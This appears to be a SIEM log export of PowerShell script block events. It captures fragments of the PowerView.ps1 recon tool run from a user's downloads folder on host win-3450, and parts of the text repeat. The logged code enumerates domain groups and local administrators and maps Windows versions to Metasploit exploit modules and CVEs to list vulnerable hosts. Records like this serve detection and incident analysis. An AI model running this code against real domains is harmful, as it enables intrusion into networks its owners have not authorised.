Get-NetDomain -Domain $Domain        if($FoundDomain) {        # query for the primary domain controller so we can extract the domain SID for filtering        $PrimaryDC = $FoundDomain.PdcRoleOwner        $PrimaryDCSID = (Get-NetComputer -Domain $Domain -ComputerName $PrimaryDC -FullData).objectsid        $Parts = $PrimaryDCSID.split(""-"")        $Parts[0..($Parts.length -2)] -join ""-""    }}function Get-NetGroup {<#    .SYNOPSIS        Gets a list of all current groups in a domain, or all        the groups a given user/group object belongs to.    .PARAMETER GroupName        The group name to query for, wildcards accepted.    .PARAMETER SID        The group SID to query for.    .PARAMETER UserName        The user name (or group name) to query for all effective        groups of.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""    .PARAMETER Domain        The domain to query for groups, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER AdminCount        Switch. Return group with adminCount=1.    .PARAMETER FullData        Switch. Return full group objects instead of just object names (the default).    .PARAMETER RawSids        Switch. Return raw SIDs when using ""Get-NetGroup -UserName ","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"DHV3ypsB8mE-0EyZ0X8m","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (24 of 26):xploit/windows/smb/ms06_066_nwapi"",""http://www.cvedetails.com/cve/2006-4688"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Server Pack 1"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Server Pack 1"",""exploit/windows/wins/ms04_045_wins"",""http://www.cvedetails.com/cve/2004-1080/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Service Pack 2"",""exploit/windows/dcerpc/ms07_029_msdns_zonename"",""http://www.cvedetails.com/cve/2007-1748"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Service Pack 2"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/wins/ms04_045_wins"",""http://www.cvedetails.com/cve/2004-1080/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/smb/ms04_011_lsass"",""http://www.cvedetails.com/cve/2003-0533/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/wins/ms04_045_wins"",""http://www.cvedetails.com/cve/2004-1080/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"",""Service Pack 2"",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"","""",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"","""",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008 R2"","""",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Server Pack 1"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Server Pack 1"",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Server Pack 1"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Service Pack 2"",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Vista"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Vista"","""",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/dcerpc/ms05_017_msmq"",""http://www.cvedetails.com/cve/2005-0059"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/smb/ms04_011_lsass"",""http://www.cvedetails.com/cve/2003-0533/"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/smb/ms05_039_pnp"",""http://www.cvedetails.com/cve/2005-1983"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/dcerpc/ms05_017_msmq"",""http://www.cvedetails.com/cve/2005-0059"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms06_066_nwapi"",""http://www.cvedetails.com/cve/2006-4688"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms06_070_wkssvc"",""http://www.cvedetails.com/cve/2006-4691"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 3"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 3"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/dcerpc/ms05_017_msmq"",""http://www.cvedetails.com/cve/2005-0059"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      # Status user            Write-Verbose ""[*] Checking computers for vulnerable OS and SP levels...""    # ----------------------------------------------------------------    # Setup data table to store vulnerable systems    # ----------------------------------------------------------------    # Create data table to house vulnerable server list    $TableVulnComputers = New-Object System.Data.DataTable     $Null = $TableVulnComputers.Columns.Add('ComputerName')    $Null = $TableVulnComputers.Columns.Add('OperatingSystem')    $Null = $TableVulnComputers.Columns.Add('ServicePack')    $Null = $TableVulnComputers.Columns.Add('LastLogon')    $Null = $TableVulnComputers.Columns.Add('MsfModule')    $Null = $TableVulnComputers.Columns.Add('CVE')    # Iterate through each exploit    $TableExploits | ForEach-Object {                         $ExploitOS = $_.OperatingSystem        $ExploitSP = $_.ServicePack        $ExploitMsf = $_.MsfModule        $ExploitCVE = $_.CVE        # Iterate through each ADS computer        $TableAdsComputers | ForEach-Object {                        $AdsHostname = $_.Hostname            $AdsOS = $_.OperatingSystem            $AdsSP = $_.ServicePack                                                                    $AdsLast = $_.LastLogon                        # Add exploitable systems to vul computers data table            if ($AdsOS -like ""$ExploitOS*"" -and $AdsSP -like ""$ExploitSP"" ) {                                    # Add domain computer to data table                                    $Null = $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,$AdsLast,$ExploitMsf,$ExploitCVE)            }        }    }             # Display results    $VulnComputer = $TableVulnComputers | Select-Object ComputerName -Unique | Measure-Object    $VulnComputerCount = $VulnComputer.Count    if ($VulnComputer.Count -gt 0) {        # Return vulnerable server list order with some hack date casting        Write-Verbose ""[+] Found $VulnComputerCount potentially vulnerable systems!""        $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending    }    else {        Write-Verbose ""[-] No vulnerable systems were found.""    }}function Invoke-EnumerateLocalAdmin {<#    .SYNOPSIS        This function queries the domain for all active machines with        Get-NetComputer, then for each server it queries the local        Administrators with Get-NetLocalGroup.        Author: @harmj0y        License: BSD 3-Clause    .PARAMETER ComputerName        Host array to enumerate, passable on the pipeline.    .PARAMETER ComputerFile        File of hostnames/IPs to search.    .PARAMETER ComputerFilter        Host filter name to query AD for, wildcards accepted.    .PARAMETER ComputerADSpath        The LDAP source to search through for hosts, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER NoPing        Switch. Don't ping each host to ensure it's up before enumerating.    .PARAMETER Delay        Delay between enumerating hosts, defaults to 0    .PARAMETER Jitter        Jitter for the host delay, defaults to +/- 0.3    .PARAMETER OutFile        Output results to a specified csv output file.    .PARAMETER NoClobber        Switch. Don't overwrite any existing output file.    .PARAMETER TrustGroups        Switch. Only return results that are not part of the local machine        or the machine's domain. Old Invoke-EnumerateLocalTrustGroup        functionality.    .PARAMETER Domain        Domain to query for machines, defaults to the current domain.        .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER SearchForest        Switch. Search all domains in the forest for target users instead of just        a single domain.    .PARAMETER Threads        The maximum concurrent threads to execute.    .EXAMPLE        PS C:\> Invoke-EnumerateLocalAdmin        Enumerates the members of local administrators for all machines        in the current domain.    .EXAMPLE        PS C:\> Invoke-EnumerateLocalAdmin -Threads 10        Threaded local admin enumeration, replaces Invoke-EnumerateLocalAdminThreaded    .LINK        http://blog.harmj0y.net/#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [Alias('Hosts')]        [String[]]        $ComputerName,        [ValidateScript({Test-Path -Path $_ })]        [Alias('HostList')]        [String]        $ComputerFile,        [String]        $ComputerFilter,        [String]        $ComputerADSpath,        [Switch]        $NoPing,        [UInt32]        $Delay = 0,        [Double]        $Jitter = .3,        [String]        $OutFile,        [Switch]        $NoClobber,        [Switch]        $TrustGroups,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $SearchForest,        [ValidateRange(1,100)]         [Int]        $Threads    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }        # random object for delay        $RandNo = New-Object System.Random        Write-Verbose ""[*] Running Invoke-EnumerateLocalAdmin with delay of $Delay""        if(!$ComputerName) {             if($Domain) {                $TargetDomains = @($Domain)            }            elseif($SearchForest) {                # get ALL the domains in the forest to search                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }            }            else {                # use the local domain                $TargetDomains = @( (Get-NetDomain).name )            }            # if we're using a host list, read the targets in and add them to the target list            if($ComputerFile) {                $ComputerName = Get-Content -Path $ComputerFile            }            else {                [array]$ComputerName = @()                ForEach ($Domain in $TargetDomains) {                    Write-Verbose ""[*] Querying domain $Domain for hosts""                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController                }            }            # remove any null target hosts, uniquify the list and shuffle it            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }            if($($ComputerName.Count) -eq 0) {                throw ""No hosts found!""            }        }        # delete any existing output file if it already exists        if(!$NoClobber) {            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }        }        if($TrustGroups) {                        Write-Verbose ""Determining domain trust groups""            # find all group names that have one or more users in another domain            $TrustGroupNames = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique            $TrustGroupsSIDs = $TrustGroupNames | ForEach-Object {                 # ignore the builtin administrators group for a DC (S-1-5-32-544)                # TODO: ignore all default built in sids?                Get-NetGroup -Domain $Domain -ScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","xploit/windows/smb/ms06_066_nwapi"",""http://www.cvedetails.com/cve/2006-4688"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Server Pack 1"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Server Pack 1"",""exploit/windows/wins/ms04_045_wins"",""http://www.cvedetails.com/cve/2004-1080/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Service Pack 2"",""exploit/windows/dcerpc/ms07_029_msdns_zonename"",""http://www.cvedetails.com/cve/2007-1748"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Service Pack 2"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003"","""",""exploit/windows/wins/ms04_045_wins"",""http://www.cvedetails.com/cve/2004-1080/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/smb/ms04_011_lsass"",""http://www.cvedetails.com/cve/2003-0533/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows Server 2003 R2"","""",""exploit/windows/wins/ms04_045_wins"",""http://www.cvedetails.com/cve/2004-1080/"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"",""Service Pack 2"",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"","""",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008"","""",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Server 2008 R2"","""",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Server Pack 1"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Server Pack 1"",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Server Pack 1"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Service Pack 2"",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows Vista"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows Vista"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows Vista"","""",""exploit/windows/smb/ms09_050_smb2_negotiate_func_index"",""http://www.cvedetails.com/cve/2009-3103"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/dcerpc/ms05_017_msmq"",""http://www.cvedetails.com/cve/2005-0059"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/smb/ms04_011_lsass"",""http://www.cvedetails.com/cve/2003-0533/"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/smb/ms05_039_pnp"",""http://www.cvedetails.com/cve/2005-1983"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Server Pack 1"",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/dcerpc/ms05_017_msmq"",""http://www.cvedetails.com/cve/2005-0059"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms06_066_nwapi"",""http://www.cvedetails.com/cve/2006-4688"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms06_070_wkssvc"",""http://www.cvedetails.com/cve/2006-4691"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 2"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 3"",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      $Null = $TableExploits.Rows.Add(""Windows XP"",""Service Pack 3"",""exploit/windows/smb/ms10_061_spoolss"",""http://www.cvedetails.com/cve/2010-2729"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/dcerpc/ms03_026_dcom"",""http://www.cvedetails.com/cve/2003-0352/"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/dcerpc/ms05_017_msmq"",""http://www.cvedetails.com/cve/2005-0059"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/smb/ms06_040_netapi"",""http://www.cvedetails.com/cve/2006-3439"")      $Null = $TableExploits.Rows.Add(""Windows XP"","""",""exploit/windows/smb/ms08_067_netapi"",""http://www.cvedetails.com/cve/2008-4250"")      # Status user            Write-Verbose ""[*] Checking computers for vulnerable OS and SP levels...""    # ----------------------------------------------------------------    # Setup data table to store vulnerable systems    # ----------------------------------------------------------------    # Create data table to house vulnerable server list    $TableVulnComputers = New-Object System.Data.DataTable     $Null = $TableVulnComputers.Columns.Add('ComputerName')    $Null = $TableVulnComputers.Columns.Add('OperatingSystem')    $Null = $TableVulnComputers.Columns.Add('ServicePack')    $Null = $TableVulnComputers.Columns.Add('LastLogon')    $Null = $TableVulnComputers.Columns.Add('MsfModule')    $Null = $TableVulnComputers.Columns.Add('CVE')    # Iterate through each exploit    $TableExploits | ForEach-Object {                         $ExploitOS = $_.OperatingSystem        $ExploitSP = $_.ServicePack        $ExploitMsf = $_.MsfModule        $ExploitCVE = $_.CVE        # Iterate through each ADS computer        $TableAdsComputers | ForEach-Object {                        $AdsHostname = $_.Hostname            $AdsOS = $_.OperatingSystem            $AdsSP = $_.ServicePack                                                                    $AdsLast = $_.LastLogon                        # Add exploitable systems to vul computers data table            if ($AdsOS -like ""$ExploitOS*"" -and $AdsSP -like ""$ExploitSP"" ) {                                    # Add domain computer to data table                                    $Null = $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,$AdsLast,$ExploitMsf,$ExploitCVE)            }        }    }             # Display results    $VulnComputer = $TableVulnComputers | Select-Object ComputerName -Unique | Measure-Object    $VulnComputerCount = $VulnComputer.Count    if ($VulnComputer.Count -gt 0) {        # Return vulnerable server list order with some hack date casting        Write-Verbose ""[+] Found $VulnComputerCount potentially vulnerable systems!""        $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending    }    else {        Write-Verbose ""[-] No vulnerable systems were found.""    }}function Invoke-EnumerateLocalAdmin {<#    .SYNOPSIS        This function queries the domain for all active machines with        Get-NetComputer, then for each server it queries the local        Administrators with Get-NetLocalGroup.        Author: @harmj0y        License: BSD 3-Clause    .PARAMETER ComputerName        Host array to enumerate, passable on the pipeline.    .PARAMETER ComputerFile        File of hostnames/IPs to search.    .PARAMETER ComputerFilter        Host filter name to query AD for, wildcards accepted.    .PARAMETER ComputerADSpath        The LDAP source to search through for hosts, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER NoPing        Switch. Don't ping each host to ensure it's up before enumerating.    .PARAMETER Delay        Delay between enumerating hosts, defaults to 0    .PARAMETER Jitter        Jitter for the host delay, defaults to +/- 0.3    .PARAMETER OutFile        Output results to a specified csv output file.    .PARAMETER NoClobber        Switch. Don't overwrite any existing output file.    .PARAMETER TrustGroups        Switch. Only return results that are not part of the local machine        or the machine's domain. Old Invoke-EnumerateLocalTrustGroup        functionality.    .PARAMETER Domain        Domain to query for machines, defaults to the current domain.        .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER SearchForest        Switch. Search all domains in the forest for target users instead of just        a single domain.    .PARAMETER Threads        The maximum concurrent threads to execute.    .EXAMPLE        PS C:\> Invoke-EnumerateLocalAdmin        Enumerates the members of local administrators for all machines        in the current domain.    .EXAMPLE        PS C:\> Invoke-EnumerateLocalAdmin -Threads 10        Threaded local admin enumeration, replaces Invoke-EnumerateLocalAdminThreaded    .LINK        http://blog.harmj0y.net/#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [Alias('Hosts')]        [String[]]        $ComputerName,        [ValidateScript({Test-Path -Path $_ })]        [Alias('HostList')]        [String]        $ComputerFile,        [String]        $ComputerFilter,        [String]        $ComputerADSpath,        [Switch]        $NoPing,        [UInt32]        $Delay = 0,        [Double]        $Jitter = .3,        [String]        $OutFile,        [Switch]        $NoClobber,        [Switch]        $TrustGroups,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $SearchForest,        [ValidateRange(1,100)]         [Int]        $Threads    )    begin {        if ($PSBoundParameters['Debug']) {            $DebugPreference = 'Continue'        }        # random object for delay        $RandNo = New-Object System.Random        Write-Verbose ""[*] Running Invoke-EnumerateLocalAdmin with delay of $Delay""        if(!$ComputerName) {             if($Domain) {                $TargetDomains = @($Domain)            }            elseif($SearchForest) {                # get ALL the domains in the forest to search                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }            }            else {                # use the local domain                $TargetDomains = @( (Get-NetDomain).name )            }            # if we're using a host list, read the targets in and add them to the target list            if($ComputerFile) {                $ComputerName = Get-Content -Path $ComputerFile            }            else {                [array]$ComputerName = @()                ForEach ($Domain in $TargetDomains) {                    Write-Verbose ""[*] Querying domain $Domain for hosts""                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController                }            }            # remove any null target hosts, uniquify the list and shuffle it            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }            if($($ComputerName.Count) -eq 0) {                throw ""No hosts found!""            }        }        # delete any existing output file if it already exists        if(!$NoClobber) {            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }        }        if($TrustGroups) {                        Write-Verbose ""Determining domain trust groups""            # find all group names that have one or more users in another domain            $TrustGroupNames = Find-ForeignGroup -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.GroupName } | Sort-Object -Unique            $TrustGroupsSIDs = $TrustGroupNames | ForEach-Object {                 # ignore the builtin administrators group for a DC (S-1-5-32-544)                # TODO: ignore all default built in sids?                Get-NetGroup -Domain $Domain -","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"DnV3ypsB8mE-0EyZ3H_V","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (14 of 26):esolving SID : $_""                                    }                                }                                $PrivilegeRights | Add-Member Noteproperty $_.Name $Sids                            }                            $Policy | Add-Member Noteproperty 'PrivilegeRights' $PrivilegeRights                        }                        else {                            $Policy | Add-Member Noteproperty $_.Name $_.Value                        }                    }                    $Policy                }                else { $_ }            }        }    }}########################################################## Functions that enumerate a single host, either through# WinNT, WMI, remote registry, or API calls # (with PSReflect).#########################################################function Get-NetLocalGroup {<#    .SYNOPSIS        Gets a list of all current users in a specified local group,        or returns the names of all local groups with -ListGroups.    .PARAMETER ComputerName        The hostname or IP to query for local group users.    .PARAMETER ComputerFile        File of hostnames/IPs to query for local group users.    .PARAMETER GroupName        The local group name to query for users. If not given, it defaults to ""Administrators""    .PARAMETER ListGroups        Switch. List all the local groups instead of their members.        Old Get-NetLocalGroups functionality.    .PARAMETER Recurse        Switch. If the local member member is a domain group, recursively try to resolve its members to get a list of domain users who can access this machine.    .EXAMPLE        PS C:\> Get-NetLocalGroup        Returns the usernames that of members of localgroup ""Administrators"" on the local host.    .EXAMPLE        PS C:\> Get-NetLocalGroup -ComputerName WINDOWSXP        Returns all the local administrator accounts for WINDOWSXP    .EXAMPLE        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -Resurse         Returns all effective local/domain users/groups that can access WINDOWS7 with        local administrative privileges.    .EXAMPLE        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -ListGroups        Returns all local groups on the WINDOWS7 host.    .LINK        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = 'localhost',        [ValidateScript({Test-Path -Path $_ })]        [Alias('HostList')]        [String]        $ComputerFile,        [String]        $GroupName = 'Administrators',        [Switch]        $ListGroups,        [Switch]        $Recurse    )    begin {        if ((-not $ListGroups) -and (-not $GroupName)) {            # resolve the SID for the local admin group - this should usually default to ""Administrators""            $ObjSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')            $Objgroup = $ObjSID.Translate( [System.Security.Principal.NTAccount])            $GroupName = ($Objgroup.Value).Split('\')[1]        }    }    process {        $Servers = @()        # if we have a host list passed, grab it        if($ComputerFile) {            $Servers = Get-Content -Path $ComputerFile        }        else {            # otherwise assume a single host name            $Servers += Get-NameField -Object $ComputerName        }        # query the specified group using the WINNT provider, and        # extract fields as appropriate from the results        ForEach($Server in $Servers) {            try {                if($ListGroups) {                    # if we're listing the group names on a remote server                    $Computer = [ADSI]""WinNT://$Server,computer""                    $Computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {                        